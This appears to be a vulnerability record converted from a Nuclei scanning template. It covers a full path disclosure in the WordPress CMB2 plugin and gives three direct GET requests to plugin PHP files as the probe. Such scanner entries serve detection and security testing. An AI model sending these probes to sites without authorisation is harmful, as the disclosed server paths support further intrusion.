# Vulnerability: WordPress CMB2 - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wordpress-cmb2-fpd.yaml`)

## Description
WordPress CMB2 plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/cmb2/includes/CMB2.php
GET {{BaseURL}}/wp-content/plugins/cmb2/includes/CMB2_Field.php
GET {{BaseURL}}/wp-content/plugins/cmb2/includes/helper-functions.php
```

